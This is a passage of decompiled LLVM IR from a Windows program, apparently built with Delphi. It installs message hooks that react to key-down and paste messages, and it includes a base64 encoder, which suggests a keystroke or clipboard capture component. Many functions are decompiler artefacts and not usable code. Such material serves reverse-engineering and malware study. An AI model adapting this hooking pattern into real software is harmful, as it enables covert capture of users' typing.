  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !991
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !991
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !991
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !992
  %3 = call i32 @function_4076ec(), !insn.addr !993
  %4 = icmp eq i32 %3, 0, !insn.addr !994
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !995
  br i1 %4, label %dec_label_pc_405740, label %dec_label_pc_4056fd, !insn.addr !995

dec_label_pc_4056fd:                              ; preds = %dec_label_pc_4056dc
  %5 = inttoptr i32 %0 to i8*, !insn.addr !996
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405764 to i32*), i8* null, i8* %5), !insn.addr !997
  %7 = ptrtoint i32* %6 to i32, !insn.addr !997
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !998
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !998
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !999
  %10 = icmp eq i1 %9, false, !insn.addr !1000
  br i1 %10, label %dec_label_pc_40573b, label %dec_label_pc_405718, !insn.addr !1001

dec_label_pc_405718:                              ; preds = %dec_label_pc_4056fd
  %11 = call i32 @function_40754c(), !insn.addr !1002
  %12 = call i32 @"@LStrAsg"(), !insn.addr !1003
  %13 = call i32 @function_407874(), !insn.addr !1004
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !1005
  br label %dec_label_pc_405740, !insn.addr !1005

dec_label_pc_40573b:                              ; preds = %dec_label_pc_4056fd
  %14 = call i32 @function_4079a8(), !insn.addr !1006
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !1006
  br label %dec_label_pc_405740, !insn.addr !1006

dec_label_pc_405740:                              ; preds = %dec_label_pc_40573b, %dec_label_pc_405718, %dec_label_pc_4056dc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1007
  %16 = load i32, i32* %15, align 4, !insn.addr !1007
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !1008
  %17 = add i32 %esp.0.reload, 8, !insn.addr !1009
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1009
  store i32 4216669, i32* %18, align 4, !insn.addr !1009
  %19 = call i32 @"@LStrClr"(), !insn.addr !1010
  ret i32 %19, !insn.addr !1011
}

define i32 @function_405756() local_unnamed_addr {
dec_label_pc_405756:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1012
  ret i32 %0, !insn.addr !1012
}

define i32 @function_40575b() local_unnamed_addr {
dec_label_pc_40575b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1013
}

define i32 @function_40575d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40575d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1014
}

define i32 @function_405761() local_unnamed_addr {
dec_label_pc_405761:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !1015
  %8 = inttoptr i32 %4 to i8*, !insn.addr !1015
  store i8 %7, i8* %8, align 1, !insn.addr !1015
  %9 = add i32 %2, 111, !insn.addr !1016
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1016
  %11 = load i8, i8* %10, align 1, !insn.addr !1016
  %12 = load i32, i32* %eax, align 4, !insn.addr !1016
  %13 = trunc i32 %12 to i8, !insn.addr !1016
  %14 = add i8 %11, %13, !insn.addr !1016
  store i8 %14, i8* %10, align 1, !insn.addr !1016
  %15 = trunc i32 %3 to i16, !insn.addr !1017
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !1017
  %17 = inttoptr i32 %0 to i32*, !insn.addr !1017
  store i32 %16, i32* %17, align 4, !insn.addr !1017
  %18 = add i32 %0, 66, !insn.addr !1018
  %19 = inttoptr i32 %18 to i64*, !insn.addr !1018
  %20 = load i64, i64* %19, align 4, !insn.addr !1018
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !1018
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !1019
  %22 = load i8, i8* %5, align 4, !insn.addr !1020
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !1020
  %25 = add i8 %22, %24, !insn.addr !1020
  %26 = inttoptr i32 %23 to i8*, !insn.addr !1020
  store i8 %25, i8* %26, align 1, !insn.addr !1020
  %27 = add i32 %21, -117, !insn.addr !1021
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1021
  %29 = load i8, i8* %28, align 1, !insn.addr !1021
  %30 = trunc i32 %3 to i8, !insn.addr !1021
  %31 = add i8 %29, %30, !insn.addr !1021
  store i8 %31, i8* %28, align 1, !insn.addr !1021
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !1022
  %33 = add i32 %21, 16, !insn.addr !1023
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1023
  %35 = load i32, i32* %34, align 4, !insn.addr !1023
  %36 = add i32 %21, 12, !insn.addr !1024
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1024
  %38 = load i32, i32* %37, align 4, !insn.addr !1024
  %39 = add i32 %21, 8, !insn.addr !1025
  %40 = inttoptr i32 %39 to i32*, !insn.addr !1025
  %41 = load i32, i32* %40, align 4, !insn.addr !1025
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !1026
  %43 = inttoptr i32 %42 to i32*, !insn.addr !1027
  %44 = load i32, i32* %43, align 4, !insn.addr !1027
  %45 = icmp eq i32 %44, 0, !insn.addr !1027
  %46 = icmp eq i1 %45, false, !insn.addr !1028
  %47 = icmp eq i32 %41, 0, !insn.addr !1029
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !1030
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_405797, label %dec_label_pc_4057c6, !insn.addr !1031

dec_label_pc_405797:                              ; preds = %dec_label_pc_405761
  store i32 %35, i32* %eax, align 4, !insn.addr !1032
  %51 = add i32 %35, 4, !insn.addr !1033
  %52 = inttoptr i32 %51 to i32*, !insn.addr !1033
  %53 = load i32, i32* %52, align 4, !insn.addr !1033
  switch i32 %53, label %dec_label_pc_4057c6 [
    i32 256, label %dec_label_pc_4057ae
    i32 770, label %dec_label_pc_4057bf
  ]

dec_label_pc_4057ae:                              ; preds = %dec_label_pc_405797
  %54 = call i32 @function_4054ec(i32 %2, i32 %1, i32 %0), !insn.addr !1034
  br label %dec_label_pc_4057c6, !insn.addr !1035

dec_label_pc_4057bf:                              ; preds = %dec_label_pc_405797
  %55 = call i32 @function_405610(i32 %2, i32 %1, i32 %0), !insn.addr !1036
  br label %dec_label_pc_4057c6, !insn.addr !1036

dec_label_pc_4057c6:                              ; preds = %dec_label_pc_405761, %dec_label_pc_405797, %dec_label_pc_4057bf, %dec_label_pc_4057ae
  %56 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1037
  %57 = inttoptr i32 %35 to i32*, !insn.addr !1038
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !1038
  ret i32 %58, !insn.addr !1039
}

define i32 @function_4057dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4057dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !1040
  %5 = icmp eq i1 %4, false, !insn.addr !1041
  %6 = icmp eq i32 %arg3, 0, !insn.addr !1042
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4057fa, label %dec_label_pc_40580c, !insn.addr !1043

dec_label_pc_4057fa:                              ; preds = %dec_label_pc_4057dc
  %8 = add i32 %arg1, 8, !insn.addr !1044
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1044
  %10 = load i32, i32* %9, align 4, !insn.addr !1044
  %11 = icmp eq i32 %10, 2, !insn.addr !1045
  %12 = icmp eq i1 %11, false, !insn.addr !1046
  br i1 %12, label %dec_label_pc_40580c, label %dec_label_pc_405804, !insn.addr !1046

dec_label_pc_405804:                              ; preds = %dec_label_pc_4057fa
  %13 = call i32 @function_4056dc(i32 %1, i32 %2, i32 %0), !insn.addr !1047
  br label %dec_label_pc_40580c, !insn.addr !1047

dec_label_pc_40580c:                              ; preds = %dec_label_pc_4057dc, %dec_label_pc_405804, %dec_label_pc_4057fa
  %14 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1048
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !1049
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !1049
  ret i32 %16, !insn.addr !1050
}

define i32 @function_405824() local_unnamed_addr {
dec_label_pc_405824:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4216688 to i32*), i32 3), !insn.addr !1051
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1051
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !1052
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4216796 to i32*), i32 4), !insn.addr !1053
  %5 = ptrtoint i32* %4 to i32, !insn.addr !1053
  store i32 %5, i32* @global_var_4096bc, align 4, !insn.addr !1054
  ret i32 %5, !insn.addr !1055
}

define i32 @function_40585c() local_unnamed_addr {
dec_label_pc_40585c:
  %0 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1056
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1057
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1057
  %3 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1058
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1059
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !1059
  %6 = sext i1 %5 to i32, !insn.addr !1059
  ret i32 %6, !insn.addr !1060
}

define i32 @function_405874() local_unnamed_addr {
dec_label_pc_405874:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1061
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1061
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1061
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1062
  %2 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1063
  %3 = add i32 %2, 1, !insn.addr !1063
  store i32 %3, i32* @global_var_4096b4, align 4, !insn.addr !1063
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1064
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1065
  ret i32 0, !insn.addr !1066
}

define i32 @function_405899() local_unnamed_addr {
dec_label_pc_405899:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1067
  ret i32 %0, !insn.addr !1067
}

define i32 @function_40589e() local_unnamed_addr {
dec_label_pc_40589e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1068
}

define i32 @function_4058a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4058a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1069
}

define i32 @function_4058a4() local_unnamed_addr {
dec_label_pc_4058a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1070
  %2 = add i32 %1, -1, !insn.addr !1070
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1070
  ret i32 %0, !insn.addr !1071
}

define i32 @function_4058af(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4058af:
  %storemerge.reg2mem = alloca i32, !insn.addr !1072
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !1072
  %5 = inttoptr i32 %3 to i32*, !insn.addr !1072
  store i32 %4, i32* %5, align 4, !insn.addr !1072
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !1073
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !1073
  %10 = add i8 %7, %9, !insn.addr !1073
  %11 = inttoptr i32 %8 to i8*, !insn.addr !1073
  store i8 %10, i8* %11, align 1, !insn.addr !1073
  %12 = load i32, i32* %eax, align 4, !insn.addr !1074
  store i32 %arg1, i32* %eax, align 4, !insn.addr !1075
  %13 = add i32 %12, 99, !insn.addr !1076
  %14 = inttoptr i32 %13 to i64*, !insn.addr !1076
  %15 = load i64, i64* %14, align 4, !insn.addr !1076
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !1076
  %17 = add i32 %16, -2, !insn.addr !1077
  %18 = inttoptr i32 %17 to i16*, !insn.addr !1077
  store i16 27241, i16* %18, align 2, !insn.addr !1077
  %19 = mul i32 %2, 2, !insn.addr !1078
  %20 = add i32 %2, 110, !insn.addr !1078
  %21 = add i32 %20, %19, !insn.addr !1078
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1078
  %23 = load i32, i32* %22, align 4, !insn.addr !1078
  %24 = sext i32 %23 to i64, !insn.addr !1078
  %25 = mul nsw i64 %24, 111, !insn.addr !1078
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !1078
  %28 = icmp eq i64 %25, %27, !insn.addr !1078
  br i1 %28, label %dec_label_pc_4058e1, label %dec_label_pc_405950, !insn.addr !1079

dec_label_pc_4058e1:                              ; preds = %dec_label_pc_4058af
  %29 = icmp eq i32 %0, 0, !insn.addr !1080
  br i1 %29, label %dec_label_pc_405958, label %dec_label_pc_4058e5, !insn.addr !1081

dec_label_pc_4058e5:                              ; preds = %dec_label_pc_4058e1
  %30 = icmp slt i32 %0, 0, !insn.addr !1080
  br i1 %30, label %dec_label_pc_405960, label %dec_label_pc_4058e7, !insn.addr !1082

dec_label_pc_4058e7:                              ; preds = %dec_label_pc_4058e5
  %31 = trunc i32 %0 to i8, !insn.addr !1080
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !351, !insn.addr !1080
  %33 = and i8 %32, 1, !insn.addr !1080
  %34 = icmp eq i8 %33, 0, !insn.addr !1080
  br i1 %34, label %dec_label_pc_405919, label %dec_label_pc_4058e9, !insn.addr !1083

dec_label_pc_4058e9:                              ; preds = %dec_label_pc_4058e7
  %35 = add i32 %12, -1, !insn.addr !1074
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !1084
  %37 = load i32, i32* %36, align 4, !insn.addr !1084
  %38 = xor i32 %37, %1, !insn.addr !1084
  store i32 %38, i32* %36, align 4, !insn.addr !1084
  %39 = add i32 %1, 959985462, !insn.addr !1085
  %40 = inttoptr i32 %39 to i32*, !insn.addr !1085
  %41 = load i32, i32* %40, align 4, !insn.addr !1085
  %42 = xor i32 %41, %1, !insn.addr !1085
  %43 = add i32 %16, -38, !insn.addr !1086
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1086
  store i32 %35, i32* %44, align 4, !insn.addr !1086
  %45 = add i32 %16, -42, !insn.addr !1087
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1087
  store i32 %42, i32* %46, align 4, !insn.addr !1087
  %47 = add i32 %16, -22, !insn.addr !1088
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1088
  store i32 0, i32* %48, align 4, !insn.addr !1088
  %49 = add i32 %16, -26, !insn.addr !1089
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1089
  store i32 0, i32* %50, align 4, !insn.addr !1089
  %51 = add i32 %16, -30, !insn.addr !1090
  %52 = inttoptr i32 %51 to i32*, !insn.addr !1090
  store i32 0, i32* %52, align 4, !insn.addr !1090
  %53 = add i32 %16, -34, !insn.addr !1091
  %54 = inttoptr i32 %53 to i32*, !insn.addr !1091
  store i32 0, i32* %54, align 4, !insn.addr !1091
  %55 = add i32 %16, -6, !insn.addr !1092
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1092
  store i32 %arg3, i32* %56, align 4, !insn.addr !1092
  %57 = add i32 %16, -46, !insn.addr !1093
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1093
  store i32 %17, i32* %58, align 4, !insn.addr !1093
  ret i32 0, !insn.addr !1093

dec_label_pc_405919:                              ; preds = %dec_label_pc_4058e7
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1094
  %60 = trunc i64 %25 to i32, !insn.addr !1078
  %61 = load i32, i32* %eax, align 4, !insn.addr !1095
  %62 = add i32 %61, 1, !insn.addr !1095
  %63 = mul i32 %59, 8, !insn.addr !1096
  %64 = add i32 %59, 48, !insn.addr !1096
  %65 = add i32 %64, %63, !insn.addr !1096
  %66 = inttoptr i32 %65 to i8*, !insn.addr !1096
  %67 = load i8, i8* %66, align 4, !insn.addr !1096
  %68 = udiv i32 %62, 256, !insn.addr !1096
  %69 = trunc i32 %68 to i8, !insn.addr !1096
  %70 = add i8 %67, %69, !insn.addr !1096
  store i8 %70, i8* %66, align 4, !insn.addr !1096
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !1097
  %71 = call i32 @"@LStrClr"(), !insn.addr !1098
  %72 = call i32 @function_4034c8(), !insn.addr !1099
  %73 = add i32 %60, -8, !insn.addr !1100
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1100
  store i32 %72, i32* %74, align 4, !insn.addr !1100
  %75 = ashr i32 %72, 31, !insn.addr !1101
  %76 = zext i32 %72 to i64, !insn.addr !1102
  %77 = zext i32 %75 to i64, !insn.addr !1102
  %78 = mul i64 %77, 4294967296, !insn.addr !1102
  %79 = or i64 %78, %76, !insn.addr !1102
  %80 = sdiv i64 %79, 3, !insn.addr !1102
  %81 = trunc i64 %80 to i32, !insn.addr !1102
  store i32 %81, i32* %eax, align 4, !insn.addr !1102
  %82 = srem i64 %79, 3, !insn.addr !1102
  %83 = trunc i64 %82 to i32, !insn.addr !1102
  %84 = icmp eq i32 %83, 0, !insn.addr !1103
  %85 = icmp eq i1 %84, false, !insn.addr !1104
  br i1 %85, label %dec_label_pc_40594f, label %dec_label_pc_405942, !insn.addr !1104

dec_label_pc_405942:                              ; preds = %dec_label_pc_405919
  %86 = load i32, i32* %74, align 4, !insn.addr !1105
  %87 = ashr i32 %86, 31, !insn.addr !1106
  %88 = zext i32 %86 to i64, !insn.addr !1107
  %89 = zext i32 %87 to i64, !insn.addr !1107
  %90 = mul i64 %89, 4294967296, !insn.addr !1107
  %91 = or i64 %90, %88, !insn.addr !1107
  %92 = sdiv i64 %91, 3, !insn.addr !1107
  %93 = trunc i64 %92 to i32, !insn.addr !1107
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !1108
  br label %dec_label_pc_40595c, !insn.addr !1108

dec_label_pc_40594f:                              ; preds = %dec_label_pc_405919
  ret i32 %81, !insn.addr !1108

dec_label_pc_405950:                              ; preds = %dec_label_pc_4058af
  %94 = load i32, i32* %eax, align 4, !insn.addr !1109
  ret i32 %94, !insn.addr !1109

dec_label_pc_405958:                              ; preds = %dec_label_pc_4058e1
  %95 = load i32, i32* %eax, align 4, !insn.addr !1110
  %96 = zext i32 %95 to i64, !insn.addr !1110
  %97 = zext i32 %arg3 to i64, !insn.addr !1110
  %98 = mul i64 %97, 4294967296, !insn.addr !1110
  %99 = or i64 %98, %96, !insn.addr !1110
  %100 = zext i32 %arg2 to i64, !insn.addr !1110
  %101 = sdiv i64 %99, %100, !insn.addr !1110
  %102 = trunc i64 %101 to i32, !insn.addr !1110
  %103 = add i32 %102, 1, !insn.addr !1111
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !1111
  br label %dec_label_pc_40595c, !insn.addr !1111

dec_label_pc_40595c:                              ; preds = %dec_label_pc_405942, %dec_label_pc_405958
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !1112
  ret i32 %104, !insn.addr !1113

dec_label_pc_405960:                              ; preds = %dec_label_pc_4058e5
  %105 = inttoptr i32 %1 to i32*, !insn.addr !1114
  %106 = load i32, i32* %105, align 4, !insn.addr !1114
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !1114
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !1115
  %109 = load i32, i32* %108, align 4, !insn.addr !1115
  %110 = add i32 %109, %107, !insn.addr !1115
  store i32 %110, i32* %108, align 4, !insn.addr !1115
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !1116
  %113 = inttoptr i32 %112 to i8*, !insn.addr !1116
  %114 = load i8, i8* %113, align 1, !insn.addr !1116
  %115 = trunc i32 %111 to i8, !insn.addr !1116
  %116 = add i8 %114, %115, !insn.addr !1116
  store i8 %116, i8* %113, align 1, !insn.addr !1116
  %117 = load i32, i32* %eax, align 4, !insn.addr !1117
  ret i32 %117, !insn.addr !1117
}

define i32 @function_405968() local_unnamed_addr {
dec_label_pc_405968:
  %ebx.0.reg2mem = alloca i32, !insn.addr !1118
  %esp.0.reg2mem = alloca i32, !insn.addr !1118
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !1119
  %3 = inttoptr i32 %2 to i32*, !insn.addr !1119
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !1120
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1120
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1118
  br label %dec_label_pc_40596a, !insn.addr !1118

dec_label_pc_40596a:                              ; preds = %dec_label_pc_405ab5, %dec_label_pc_405968
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !1121
  %25 = add i32 %24, 3, !insn.addr !1122
  %26 = load i32, i32* %3, align 4, !insn.addr !1119
  %27 = icmp sgt i32 %25, %26, !insn.addr !1123
  br i1 %27, label %dec_label_pc_405a0a, label %dec_label_pc_40597b, !insn.addr !1123

dec_label_pc_40597b:                              ; preds = %dec_label_pc_40596a
  %28 = add i32 %24, %0, !insn.addr !1124
  %29 = inttoptr i32 %28 to i8*, !insn.addr !1124
  %30 = load i8, i8* %29, align 1, !insn.addr !1124
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !1125
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1126
  %34 = inttoptr i32 %33 to i8*, !insn.addr !1126
  %35 = load i8, i8* %34, align 1, !insn.addr !1126
  store i8 %35, i8* %5, align 1, !insn.addr !1127
  %36 = load i8, i8* %29, align 1, !insn.addr !1128
  %37 = mul i8 %36, 16, !insn.addr !1129
  %38 = and i8 %37, 48, !insn.addr !1130
  %39 = add i32 %28, 1, !insn.addr !1131
  %40 = inttoptr i32 %39 to i8*, !insn.addr !1131
  %41 = load i8, i8* %40, align 1, !insn.addr !1131
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !1132
  %44 = zext i8 %43 to i32, !insn.addr !1132
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1133
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1133
  %47 = load i8, i8* %46, align 1, !insn.addr !1133
  store i8 %47, i8* %7, align 1, !insn.addr !1134
  %48 = load i8, i8* %40, align 1, !insn.addr !1135
  %49 = mul i8 %48, 4, !insn.addr !1136
  %50 = and i8 %49, 60, !insn.addr !1137
  %51 = add i32 %28, 2, !insn.addr !1138
  %52 = inttoptr i32 %51 to i8*, !insn.addr !1138
  %53 = load i8, i8* %52, align 1, !insn.addr !1138
  %54 = udiv i8 %53, 64, !insn.addr !1139
  %55 = or i8 %54, %50, !insn.addr !1140
  %56 = zext i8 %55 to i32, !insn.addr !1140
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1141
  %58 = inttoptr i32 %57 to i8*, !insn.addr !1141
  %59 = load i8, i8* %58, align 1, !insn.addr !1141
  store i8 %59, i8* %9, align 1, !insn.addr !1142
  %60 = and i8 %53, 63, !insn.addr !1143
  %61 = zext i8 %60 to i32, !insn.addr !1143
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1144
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1144
  %64 = load i8, i8* %63, align 1, !insn.addr !1144
  store i8 %64, i8* %11, align 1, !insn.addr !1145
  br label %dec_label_pc_405ab5, !insn.addr !1146

dec_label_pc_405a0a:                              ; preds = %dec_label_pc_40596a
  %65 = add i32 %24, 2, !insn.addr !1147
  %66 = icmp sgt i32 %65, %26, !insn.addr !1148
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_405a79, label %dec_label_pc_405a14, !insn.addr !1148

dec_label_pc_405a14:                              ; preds = %dec_label_pc_405a0a
  %76 = mul i8 %75, 16, !insn.addr !1149
  %77 = and i8 %76, 48, !insn.addr !1150
  %78 = add i32 %67, 1, !insn.addr !1151
  %79 = inttoptr i32 %78 to i8*, !insn.addr !1151
  %80 = load i8, i8* %79, align 1, !insn.addr !1151
  %81 = zext i8 %80 to i32, !insn.addr !1151
  %82 = udiv i8 %80, 16, !insn.addr !1152
  %83 = or i8 %82, %77, !insn.addr !1153
  %84 = zext i8 %83 to i32, !insn.addr !1153
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1154
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1154
  %87 = load i8, i8* %86, align 1, !insn.addr !1154
  store i8 %87, i8* %7, align 1, !insn.addr !1155
  %88 = mul i32 %81, 4, !insn.addr !1156
  %89 = and i32 %88, 60, !insn.addr !1157
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1158
  %91 = inttoptr i32 %90 to i8*, !insn.addr !1158
  %92 = load i8, i8* %91, align 4, !insn.addr !1158
  store i8 %92, i8* %9, align 1, !insn.addr !1159
  store i8 61, i8* %11, align 1, !insn.addr !1160
  br label %dec_label_pc_405ab5, !insn.addr !1161

dec_label_pc_405a79:                              ; preds = %dec_label_pc_405a0a
  %93 = zext i8 %75 to i32, !insn.addr !1162
  %94 = mul i32 %93, 16, !insn.addr !1163
  %95 = and i32 %94, 48, !insn.addr !1164
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058b4 to i32), !insn.addr !1165
  %97 = inttoptr i32 %96 to i8*, !insn.addr !1165
  %98 = load i8, i8* %97, align 16, !insn.addr !1165
  store i8 %98, i8* %7, align 1, !insn.addr !1166
  store i8 61, i8* %9, align 1, !insn.addr !1167
  store i8 61, i8* %11, align 1, !insn.addr !1168
  br label %dec_label_pc_405ab5, !insn.addr !1168

dec_label_pc_405ab5:                              ; preds = %dec_label_pc_405a79, %dec_label_pc_405a14, %dec_label_pc_40597b
  %99 = load i32, i32* %13, align 4, !insn.addr !1120
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1169
  %101 = load i32, i32* %100, align 4, !insn.addr !1169
  %102 = add i32 %esp.0.reload, -4, !insn.addr !1169
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1169
  store i32 %101, i32* %103, align 4, !insn.addr !1169
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !1170
  %105 = load i32, i32* %15, align 4, !insn.addr !1171
  %106 = add i32 %esp.0.reload, -8, !insn.addr !1171
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1171
